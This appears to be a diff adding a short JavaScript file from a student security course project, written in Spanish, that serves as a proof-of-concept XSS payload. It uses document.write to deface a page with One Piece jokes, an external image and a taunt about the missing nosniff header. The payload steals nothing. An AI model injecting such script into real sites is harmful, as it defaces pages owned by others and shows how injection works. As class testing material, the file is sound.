@@ -1,0 +1,12 @@
+/* Este archivo .txt es una prueba de ataque de la entrega_4 para el proyecto de sgssi. */
+
+//URL de foto de One Piece
+var onepiece_img = 'https://www.somosxbox.com/wp-content/uploads/2018/02/one-piece-mugiwaras.jpg'; 
+
+//Este código demuestra el exito visualmente.
+document.write('<center><h1>¡XSS Éxitoso! EL ONE PIECE ES REAL.</h1>');
+document.write('<p>¡Yohohoho! La seguridad de este servidor está tan muerta como yo.</p>');
+document.write('<img src="' + onepiece_img + '" width="400">');
+document.write('<h2>¡Bro, pon el nosniff o te robaré el barco y los huesos!</h2></center>');
+
+
